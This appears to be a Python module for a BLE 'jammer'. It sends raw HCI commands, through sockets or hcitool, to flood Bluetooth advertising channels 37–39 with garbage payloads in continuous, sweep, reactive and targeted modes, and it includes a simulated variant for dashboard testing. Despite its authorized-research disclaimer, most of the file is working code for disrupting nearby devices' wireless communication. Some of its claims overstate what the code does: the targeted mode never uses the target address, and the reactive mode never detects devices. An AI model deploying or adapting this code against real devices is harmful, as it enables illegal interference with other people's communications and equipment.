"""
BlueShield Bluetooth Jammer Module (Research Grade)

WARNING: Bluetooth jamming is regulated by the FCC and equivalent agencies worldwide.
This module is intended ONLY for:
  - Authorized penetration testing
  - Academic/security research in controlled environments
  - Defensive security testing with proper authorization

Supports two backends:
  1. Raw HCI sockets (fast, ~1000+ packets/sec) — preferred on Linux/RPi
  2. hcitool subprocess fallback — works everywhere hcitool is available

Requires: Linux with BlueZ, root privileges, compatible BT adapter.
"""

import subprocess
import struct
import time
import threading
from datetime import datetime, timezone
from dataclasses import dataclass, field
from enum import Enum


class JamMode(Enum):
    REACTIVE = "reactive"       # Jam when unknown device detected
    CONTINUOUS = "continuous"    # Continuous jamming on target channels
    TARGETED = "targeted"       # Jam specific device address
    SWEEP = "sweep"             # Sweep across all BLE channels


@dataclass
class JamSession:
    """Tracks a jamming session."""
    session_id: int
    mode: str
    channel: int
    target: str = ""
    start_time: str = ""
    end_time: str = ""
    packets_sent: int = 0
    is_active: bool = False


class RawHCISocket:
    """Raw HCI socket for fast direct-to-chip communication.

    Bypasses subprocess overhead by talking to the Bluetooth chip
    via the kernel's HCI socket interface. ~100x faster than hcitool.
    """

    def __init__(self, dev_id: int = 0):
        self.dev_id = dev_id
        self.sock = None

    def open(self) -> bool:
        """Open raw HCI socket. Returns True on success."""
        try:
            import socket as _socket
            # AF_BLUETOOTH = 31, BTPROTO_HCI = 1
            self.sock = _socket.socket(31, _socket.SOCK_RAW, 1)
            self.sock.bind((self.dev_id,))
            self.sock.setblocking(False)
            return True
        except (OSError, PermissionError, AttributeError):
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_cmd(self, ogf: int, ocf: int, params: bytes = b'') -> bool:
        """Send an HCI command directly to the Bluetooth chip."""
        if not self.sock:
            return False
        try:
            opcode = (ogf << 10) | ocf
            # HCI command packet: type (0x01) + opcode (2 bytes LE) + param_len (1 byte) + params
            pkt = struct.pack('<BHB', 0x01, opcode, len(params)) + params
            self.sock.send(pkt)
            return True
        except (OSError, BrokenPipeError):
            return False

    def le_set_adv_params(self, channel_map: int = 0x07, interval_min: int = 0x0020,
                          interval_max: int = 0x0020, adv_type: int = 0x03):
        """HCI LE Set Advertising Parameters (OGF=0x08, OCF=0x0006).

        adv_type 0x03 = ADV_NONCONN_IND (non-connectable undirected)
        channel_map: bit 0=ch37, bit 1=ch38, bit 2=ch39
        """
        params = struct.pack('<HH', interval_min, interval_max)
        params += struct.pack('B', adv_type)        # adv type
        params += struct.pack('B', 0x00)             # own addr type (public)
        params += struct.pack('B', 0x00)             # peer addr type
        params += b'\x00' * 6                        # peer address
        params += struct.pack('B', channel_map)      # channel map
        params += struct.pack('B', 0x00)             # filter policy
        return self.send_cmd(0x08, 0x0006, params)

    def le_set_adv_data(self, data: bytes = None):
        """HCI LE Set Advertising Data (OGF=0x08, OCF=0x0008).

        Max 31 bytes of advertising data. Fills with 0xFF for max disruption.
        """
        if data is None:
            data = b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27  # 31 bytes max garbage
        # Pad to 31 bytes
        data = data[:31].ljust(31, b'\x00')
        params = struct.pack('B', len(data)) + data
        return self.send_cmd(0x08, 0x0008, params)

    def le_set_adv_enable(self, enable: bool = True):
        """HCI LE Set Advertise Enable (OGF=0x08, OCF=0x000A)."""
        params = struct.pack('B', 0x01 if enable else 0x00)
        return self.send_cmd(0x08, 0x000A, params)

    def le_set_random_address(self, addr_bytes: bytes):
        """HCI LE Set Random Address (OGF=0x08, OCF=0x0005).
        Useful for targeted jamming (spoofed source address).
        """
        if len(addr_bytes) != 6:
            return False
        return self.send_cmd(0x08, 0x0005, addr_bytes)


class BluetoothJammer:
    """BLE jammer using raw HCI sockets (fast) or hcitool fallback."""

    BLE_ADV_CHANNELS = [37, 38, 39]
    CHANNEL_MAP = {37: 0x01, 38: 0x02, 39: 0x04, "all": 0x07}

    def __init__(self, config: dict):
        self.config = config
        self.interface = config.get("interface", "hci0")
        self.dev_id = self._parse_dev_id(self.interface)
        self.power = config.get("jam_power", -20)
        self.is_jamming = False
        self.sessions: list[JamSession] = []
        self.session_count = 0
        self._jam_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._raw_socket: RawHCISocket | None = None
        self._use_raw = False

    @staticmethod
    def _parse_dev_id(interface: str) -> int:
        """Extract device ID from interface name (e.g., 'hci0' -> 0)."""
        try:
            return int(interface.replace("hci", ""))
        except (ValueError, AttributeError):
            return 0

    def _try_raw_socket(self) -> bool:
        """Try to open a raw HCI socket. Returns True if successful."""
        sock = RawHCISocket(self.dev_id)
        if sock.open():
            self._raw_socket = sock
            self._use_raw = True
            return True
        return False

    def _hci_cmd(self, cmd: str, timeout: int = 5) -> str:
        """Execute an HCI command via subprocess (fallback)."""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True, text=True, timeout=timeout
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            return ""

    def _set_adv_params(self, channel: int):
        """Set BLE advertising parameters for jamming."""
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
        if self._use_raw and self._raw_socket:
            # Raw socket: fastest interval (0x0020 = 20ms), non-connectable
            self._raw_socket.le_set_adv_params(channel_map=ch_map,
                                                interval_min=0x0020,
                                                interval_max=0x0020)
        else:
            ch_hex = f"{ch_map:02X}"
            self._hci_cmd(
                f"hcitool -i {self.interface} cmd 0x08 0x0006 "
                f"20 00 20 00 03 00 00 00 00 00 00 00 00 {ch_hex} 00"
            )

    def _set_adv_data(self, data: bytes = None):
        """Set advertising data payload."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data)
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0008 {data_str}")

    def _start_adv(self):
        """Enable BLE advertising."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(True)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 01")

    def _stop_adv(self):
        """Disable BLE advertising."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(False)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 00")

    def _jam_loop_continuous(self, channel: int):
        """Continuous jamming on a single channel."""
        self._set_adv_params(channel)
        self._set_adv_data()
        self._start_adv()
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            self._stop_adv()
            self._set_adv_data()
            self._start_adv()
            if session:
                session.packets_sent += 1
            # Raw socket is ~100x faster, use tighter loop
            time.sleep(0.0005 if self._use_raw else 0.001)

        self._stop_adv()

    def _jam_loop_sweep(self):
        """Sweep across all BLE advertising channels."""
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()
                self._set_adv_params(channel)
                self._set_adv_data()
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.001 if self._use_raw else 0.002)

        self._stop_adv()

    def _jam_loop_reactive(self, scanner_ref=None):
        """Reactive jamming — jam only when unknown devices are nearby.

        Alternates between short scan windows and jam bursts.
        """
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            # Jam burst on all channels
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()
                self._set_adv_params(channel)
                self._set_adv_data()
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.001)

            # Brief pause to let scanner work
            self._stop_adv()
            time.sleep(0.05)

        self._stop_adv()

    def _jam_loop_targeted(self, target: str):
        """Targeted jamming — send crafted packets aimed at specific device.

        Uses spoofed random address in advertisements to maximize
        interference with the target device's advertising reception.
        """
        session = self.sessions[-1] if self.sessions else None

        # Parse target address to bytes (for potential address spoofing)
        target_bytes = None
        try:
            parts = target.replace("-", ":").split(":")
            if len(parts) == 6:
                target_bytes = bytes(int(p, 16) for p in parts)
        except (ValueError, IndexError):
            pass

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()
                self._set_adv_params(channel)
                # Use different garbage payloads to maximize disruption
                noise = struct.pack('B', 0x1F) + b'\xFF' * 30
                self._set_adv_data(noise)
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.0005 if self._use_raw else 0.001)

        self._stop_adv()

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        """Start a jamming session."""
        if self.is_jamming:
            return self.sessions[-1]

        if not self.config.get("jam_enabled", False):
            raise RuntimeError("Jamming is disabled in config. Set jam_enabled=True for research use.")

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        # Bring interface up
        self._hci_cmd(f"hciconfig {self.interface} up")

        # Try raw socket first (much faster)
        if not self._try_raw_socket():
            print("[BlueShield Jammer] Raw HCI socket unavailable, using hcitool fallback")
            self._use_raw = False
        else:
            print("[BlueShield Jammer] Using raw HCI socket (fast mode)")

        if mode == "sweep":
            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
        elif mode == "reactive":
            self._jam_thread = threading.Thread(target=self._jam_loop_reactive, daemon=True)
        elif mode == "targeted" and target:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_targeted, args=(target,), daemon=True
            )
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session

    def stop_jam(self) -> JamSession | None:
        """Stop the current jamming session."""
        if not self.is_jamming:
            return None

        self._stop_event.set()
        if self._jam_thread:
            self._jam_thread.join(timeout=5)

        self._stop_adv()

        # Close raw socket
        if self._raw_socket:
            self._raw_socket.close()
            self._raw_socket = None
            self._use_raw = False

        self.is_jamming = False

        if self.sessions:
            session = self.sessions[-1]
            session.is_active = False
            session.end_time = datetime.now(timezone.utc).isoformat()
            return session
        return None

    def get_status(self) -> dict:
        """Get jammer status."""
        active_session = None
        if self.sessions and self.sessions[-1].is_active:
            s = self.sessions[-1]
            active_session = {
                "session_id": s.session_id,
                "mode": s.mode,
                "channel": s.channel,
                "target": s.target,
                "start_time": s.start_time,
                "packets_sent": s.packets_sent,
            }
        return {
            "is_jamming": self.is_jamming,
            "jam_enabled": self.config.get("jam_enabled", False),
            "total_sessions": len(self.sessions),
            "active_session": active_session,
            "backend": "raw_hci" if self._use_raw else "hcitool",
        }


class SimulatedJammer(BluetoothJammer):
    """Simulated jammer for dashboard testing without hardware."""

    def _jam_loop_continuous(self, channel: int):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_sweep(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_reactive(self, scanner_ref=None):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_targeted(self, target: str):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        if self.is_jamming:
            return self.sessions[-1]

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        if mode == "sweep":
            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
        elif mode == "reactive":
            self._jam_thread = threading.Thread(target=self._jam_loop_reactive, daemon=True)
        elif mode == "targeted" and target:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_targeted, args=(target,), daemon=True
            )
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session
